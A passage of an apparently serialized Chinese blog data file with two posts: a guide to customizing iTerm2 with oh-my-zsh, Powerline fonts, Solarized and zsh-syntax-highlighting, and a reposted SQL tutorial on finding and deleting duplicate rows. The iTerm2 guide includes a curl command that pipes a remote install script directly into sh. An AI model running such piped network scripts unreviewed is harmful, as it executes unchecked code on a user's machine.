的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（<code>brew install coreutils</code>），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：</p>\n<p><code>$ vi ~/.bash_profile\nexport CLICOLOR=1</code></p>\n","excerpt":"","more":"<p>本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。</p>\n<h1 id=\"1-首先下载-iTerm-2\"><a href=\"#1-首先下载-iTerm-2\" class=\"headerlink\" title=\"1.首先下载 iTerm 2\"></a>1.首先下载 iTerm 2</h1><h1 id=\"2-打开iTerm-2\"><a href=\"#2-打开iTerm-2\" class=\"headerlink\" title=\"2.打开iTerm 2\"></a>2.打开iTerm 2</h1><h1 id=\"3-输入下面指令安装oh-my-zsh\"><a href=\"#3-输入下面指令安装oh-my-zsh\" class=\"headerlink\" title=\"3.输入下面指令安装oh-my-zsh\"></a>3.输入下面指令安装oh-my-zsh</h1><p><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code></p>\n<h1 id=\"4-接下来安装Powerline\"><a href=\"#4-接下来安装Powerline\" class=\"headerlink\" title=\"4.接下来安装Powerline\"></a>4.接下来安装Powerline</h1><p>在官网有教程，我们只需要执行官网第一条安装指令就行<br>如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装</p>\n<p><code>pip install powerline-status</code></p>\n<p>如果没有，则先执行安装pip指令</p>\n<p><code>sudo easy_install pip</code></p>\n<h1 id=\"5-下载、安装库字体库\"><a href=\"#5-下载、安装库字体库\" class=\"headerlink\" title=\"5.下载、安装库字体库\"></a>5.下载、安装库字体库</h1><p>1）将工程下载下来后cd到<code>install.sh</code>文件所在目录<br>2）执行指令安装字体库</p>\n<p>执行<code>./install.sh</code>指令安装所有Powerline字体</p>\n<p>安装完成后提示所有字体均已下载到<code>/Users/superdanny/Library/Fonts</code>路径下<br><code>All Powerline fonts installed to /Users/superdanny/Library/Fonts</code></p>\n<h1 id=\"6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\"><a href=\"#6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\" class=\"headerlink\" title=\"6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\"></a>6. 设置iTerm 2的Regular Font 和 Non-ASCII Font</h1><p>安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline</p>\n<h3 id=\"7-配色方案\"><a href=\"#7-配色方案\" class=\"headerlink\" title=\"7. 配色方案\"></a>7. 配色方案</h3><p>1）安装配色方案<br>进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里</p>\n<p>2）配置配色方案<br>通过load presets选择刚刚安装的配色主题即可</p>\n<h3 id=\"8-使用agnoster主题\"><a href=\"#8-使用agnoster主题\" class=\"headerlink\" title=\"8. 使用agnoster主题\"></a>8. 使用agnoster主题</h3><p>1）下载agnoster主题<br>到下载的工程里面运行install文件,主题将安装到<code>~/.oh-my-zsh/themes</code>目录下</p>\n<p>2）设置该主题<br>进入~/.zshrc打开.zshrc文件，然后将<code>ZSH_THEME</code>后面的字段改为<code>agnoster</code>。<code>ZSH_THEME=&quot;agnoster&quot;</code>（agnoster即为要设置的主题）</p>\n<h3 id=\"9-增加指令高亮效果——zsh-syntax-highlighting\"><a href=\"#9-增加指令高亮效果——zsh-syntax-highlighting\" class=\"headerlink\" title=\"9. 增加指令高亮效果——zsh-syntax-highlighting\"></a>9. 增加指令高亮效果——zsh-syntax-highlighting</h3><p>指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮</p>\n<p>1）cd到.zshrc所在目录</p>\n<p>2）执行指令将工程克隆到当前目录</p>\n<p><code>git clone git://github.com/zsh-users/zsh-syntax-highlighting.git</code></p>\n<p>3）打开.zshrc文件，在最后添加下面内容</p>\n<p><code>source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p>\n<p>保存文件。</p>\n<p>注意：xxx代表<code>.zshrc</code>所在目录</p>\n<p>4）<code>cd ~/.oh-my-zsh/custom/plugins</code></p>\n<p>5）再次打开<code>.zshrc</code>文件，在最后面添加下面内容<code>plugins=(zsh-syntax-highlighting)</code>保存文件。</p>\n<p><strong>启动iTerm 2 默认使用dash改用zsh解决方法：</strong><br><code>chsh -s /bin/zsh</code></p>\n<h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p><code>$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/</code><br><code>$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized</code></p>\n<h3 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\"></a>ls</h3><p>Mac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（<code>brew install coreutils</code>），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：</p>\n<p><code>$ vi ~/.bash_profile\nexport CLICOLOR=1</code></p>\n"},{"title":"SQL重复记录查询（转载）","date":"2016-10-05T18:34:04.000Z","_content":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> * <font color=\"#0000ff\">from</font> testtable</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span 